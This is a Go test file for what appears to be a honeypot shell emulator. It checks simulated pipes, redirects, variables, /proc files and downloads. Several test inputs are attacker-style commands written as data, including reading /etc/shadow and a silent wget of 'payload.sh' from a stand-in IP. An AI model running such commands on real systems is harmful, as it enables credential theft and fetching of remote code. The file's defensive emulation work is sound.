package cmd

import (
	"strings"
	"testing"
)

// TestPipelineFilters 管道下游必须真正生效（旧实现直接丢弃右侧命令）。
func TestPipelineFilters(t *testing.T) {
	p := newProcessor()
	st := newSession()

	cases := []struct {
		line string
		want string
		bad  string
	}{
		{"ps aux | head -3", "USER", "systemd"},
		{"ls /etc | head -3", "hostname", "shadow"},
		{"echo one two | wc -w", "2", "one two"},
		{"cat /etc/passwd | grep admin", "admin:x:1000", "root:x:0:0"},
		{"cat /etc/passwd | grep -c root", "1", "root:x"},
		{"cat /etc/passwd | grep -v root | head -1", "daemon:x:1:1", "root:x:0:0"},
	}
	for _, c := range cases {
		out := p.Execute(st, c.line)
		if !strings.Contains(out.Text, c.want) {
			t.Fatalf("%q 输出=%q, 期望包含 %q", c.line, out.Text, c.want)
		}
		if c.bad != "" && strings.Contains(out.Text, c.bad) {
			t.Fatalf("%q 输出=%q, 不应包含 %q", c.line, out.Text, c.bad)
		}
	}

	// 多级管道：grep 后再 head
	out := p.Execute(st, "cat /etc/passwd | grep :/bin/bash$ | head -1")
	if strings.Count(out.Text, "\n") != 1 || !strings.Contains(out.Text, "root") {
		t.Fatalf("多级管道输出=%q", out.Text)
	}

	// 下游是未知命令时保留上游输出（降级行为）
	out = p.Execute(st, "whoami | sha0sum")
	if out.Text != "root\n" {
		t.Fatalf("未知下游应保留上游输出: %q", out.Text)
	}
}

// TestRedirectVariants 2> 与 >/dev/null 不能被当成文件名参数。
func TestRedirectVariants(t *testing.T) {
	p := newProcessor()
	st := newSession()

	// 2>&1 后接管道：以前会把 "2>&1" 当文件名
	out := p.Execute(st, "cat /etc/shadow 2>&1 | head -2")
	if strings.Contains(out.Text, "No such file") {
		t.Fatalf("2>&1 被当作参数: %q", out.Text)
	}
	if strings.Count(out.Text, "\n") != 2 || !strings.Contains(out.Text, "root:$6$") {
		t.Fatalf("2>&1 | head -2 输出=%q", out.Text)
	}

	// 2>/dev/null：错误被丢弃，命令本身仍执行
	if out := p.Execute(st, "cat /nope 2>/dev/null"); out.Text != "" {
		t.Fatalf("2>/dev/null 输出=%q", out.Text)
	}
	// >/dev/null 丢弃 stdout
	if out := p.Execute(st, "echo hidden > /dev/null"); out.Text != "" {
		t.Fatalf(">/dev/null 输出=%q", out.Text)
	}
	// 引号内的 > 不是重定向
	if out := p.Execute(st, `echo "a > b"`); out.Text != "a > b\n" {
		t.Fatalf("引号内 > 输出=%q", out.Text)
	}
	// 追加与覆盖仍然正常
	p.Execute(st, "echo one > /tmp/r.txt")
	p.Execute(st, "echo two >> /tmp/r.txt")
	if out := p.Execute(st, "cat /tmp/r.txt"); out.Text != "one\ntwo\n" {
		t.Fatalf("重定向内容=%q", out.Text)
	}
}

// TestVarExpansion 变量展开与 bash 保持一致。
func TestVarExpansion(t *testing.T) {
	p := newProcessor()
	st := newSession()

	cases := map[string]string{
		"echo $HOME":             "/root\n",
		"echo $USER":             "root\n",
		"echo $SHELL":            "/bin/bash\n",
		"echo ${HOME}/x":         "/root/x\n",
		"echo $UID":              "0\n",
		"echo $HOSTNAME":         "svr01\n",
		"echo '$HOME'":           "$HOME\n",
		`echo "$USER@$HOSTNAME"`: "root@svr01\n",
		"echo $NOSUCHVAR-end":    "-end\n",
		"echo $?":                "0\n",
		"echo $((1+2))":          "$((1+2))\n",
	}
	for line, want := range cases {
		if out := p.Execute(st, line); out.Text != want {
			t.Fatalf("%q 输出=%q, 期望 %q", line, out.Text, want)
		}
	}
	// 路径相关变量在干净会话里校验（cd 会改变 PWD）
	for line, want := range map[string]string{
		"echo a$PWD":              "a/root\n",
		"cd /tmp && echo $PWD":    "/tmp\n",
		"cd /tmp && echo $OLDPWD": "/root\n",
	} {
		if out := p.Execute(newSession(), line); out.Text != want {
			t.Fatalf("%q 输出=%q, 期望 %q", line, out.Text, want)
		}
	}
	// 非 root 用户 UID 为 1000
	admin := newSession()
	admin.Username = "admin"
	admin.HomeDir = "/home/admin"
	admin.Cwd = "/home/admin"
	if out := p.Execute(admin, "echo $UID $HOME"); out.Text != "1000 /home/admin\n" {
		t.Fatalf("普通用户变量展开=%q", out.Text)
	}
}

// TestProcFiles /proc 常见取证文件必须存在且与系统画像一致。
func TestProcFiles(t *testing.T) {
	p := newProcessor()
	st := newSession()

	cases := map[string]string{
		"cat /proc/version":     "Linux version 5.15.0-91-generic",
		"cat /proc/uptime":      "4077025.12",
		"cat /proc/loadavg":     "0.08 0.03 0.01",
		"cat /proc/cmdline":     "BOOT_IMAGE=/boot/vmlinuz-5.15.0-91-generic",
		"cat /proc/mounts":      "/dev/sda1 / ext4",
		"cat /proc/cpuinfo":     "Xeon",
		"cat /proc/meminfo":     "MemTotal",
		"cat /proc/filesystems": "ext4",
	}
	for line, want := range cases {
		out := p.Execute(st, line)
		if !strings.Contains(out.Text, want) {
			t.Fatalf("%q 输出=%q, 期望包含 %q", line, out.Text, want)
		}
	}
}

// TestDownloadArgs 下载命令的选项处理：--version 不得记成 URL，-O 指定落地路径。
func TestDownloadArgs(t *testing.T) {
	p := newProcessor()
	st := newSession()

	if out := p.Execute(st, "wget --version"); !strings.Contains(out.Text, "GNU Wget") {
		t.Fatalf("wget --version 输出=%q", out.Text)
	}
	if out := p.Execute(st, "curl --version"); !strings.Contains(out.Text, "curl 7.81.0") {
		t.Fatalf("curl --version 输出=%q", out.Text)
	}
	if got := downloadURL([]string{"--version"}); got != "" {
		t.Fatalf("--version 不应被当作 URL: %q", got)
	}
	if got := downloadURL([]string{"-O", "/tmp/p.sh", "http://1.2.3.4/p.sh"}); got != "http://1.2.3.4/p.sh" {
		t.Fatalf("URL 解析错误: %q", got)
	}
	if got := downloadURL([]string{"http://1.2.3.4/a.sh", "-O", "/tmp/a.sh"}); got != "http://1.2.3.4/a.sh" {
		t.Fatalf("URL 解析错误: %q", got)
	}

	// -q 静默下载：无输出但文件落地
	if out := p.Execute(st, "wget -q -O /tmp/payload.sh http://1.2.3.4/payload.sh"); out.Text != "" {
		t.Fatalf("wget -q 应无输出: %q", out.Text)
	}
	if content, ok := st.FS.ReadFile(st.Cwd, "/tmp/payload.sh"); !ok || !strings.Contains(content, "payload") {
		t.Fatalf("下载文件未落地: ok=%v content=%q", ok, content)
	}
	// 普通下载输出包含保存路径
	out := p.Execute(st, "wget http://1.2.3.4/x.sh")
	if !strings.Contains(out.Text, "Saving to: 'x.sh'") {
		t.Fatalf("wget 输出=%q", out.Text)
	}
}

// TestWcFileFlags wc 读文件时同样要遵守 -l/-w/-c（旧实现固定输出三列）。
func TestWcFileFlags(t *testing.T) {
	p := newProcessor()
	st := newSession()
	p.Execute(st, "echo one two > /tmp/w.txt")
	p.Execute(st, "echo three >> /tmp/w.txt")

	cases := map[string]string{
		"wc -l /tmp/w.txt": "2 /tmp/w.txt\n",
		"wc -w /tmp/w.txt": "3 /tmp/w.txt\n",
		"wc -c /tmp/w.txt": "14 /tmp/w.txt\n",
	}
	for line, want := range cases {
		if out := p.Execute(st, line); out.Text != want {
			t.Fatalf("%q 输出=%q, 期望 %q", line, out.Text, want)
		}
	}
	// 无选项：三列 + 文件名
	out := p.Execute(st, "wc /tmp/w.txt")
	if strings.Count(out.Text, "/tmp/w.txt") != 1 || !strings.Contains(out.Text, "14") {
		t.Fatalf("wc 默认输出=%q", out.Text)
	}
	// 多文件：额外一行 total
	out = p.Execute(st, "wc -l /tmp/w.txt /tmp/w.txt")
	if !strings.Contains(out.Text, "total") || !strings.Contains(out.Text, "4 total") {
		t.Fatalf("wc 多文件输出=%q", out.Text)
	}
}

// TestFilterHelpers 过滤器辅助函数。
func TestFilterHelpers(t *testing.T) {
	if got := headLines("a\nb\nc\nd\n", 2, false); got != "a\nb" {
		t.Fatalf("headLines=%q", got)
	}
	if got := headLines("a\nb\nc\nd\n", 2, true); got != "c\nd" {
		t.Fatalf("tailLines=%q", got)
	}
	if got := sortStdin("b\na\nc\n", nil); got != "a\nb\nc" {
		t.Fatalf("sort=%q", got)
	}
	if got := sortStdin("b\na\nb\n", []string{"-u"}); got != "a\nb" {
		t.Fatalf("sort -u=%q", got)
	}
	if got := uniqStdin("a\na\nb\n", []string{"-c"}); !strings.Contains(got, "a") {
		t.Fatalf("uniq -c=%q", got)
	}
	if got := cutStdin("root:x:0\nbin:x:2\n", []string{"-d", ":", "-f", "1"}); got != "root\nbin" {
		t.Fatalf("cut=%q", got)
	}
	if got := trStdin("a-b-c", []string{"-", "+"}); got != "a+b+c" {
		t.Fatalf("tr=%q", got)
	}
	if got := trStdin("abc", []string{"a-z", "A-Z"}); got != "ABC" {
		t.Fatalf("tr 区间=%q", got)
	}
	if got := trStdin("a\nb\n", []string{"-d", "\\n"}); got != "ab" {
		t.Fatalf("tr -d=%q", got)
	}
	if got := wcStdin("one two\nthree\n", []string{"-l"}); got != "2" {
		t.Fatalf("wc -l=%q", got)
	}
	if got := nlStdin("a\nb\n"); !strings.Contains(got, "1\ta") {
		t.Fatalf("nl=%q", got)
	}
	if got := revStdin("abc"); got != "cba" {
		t.Fatalf("rev=%q", got)
	}
}
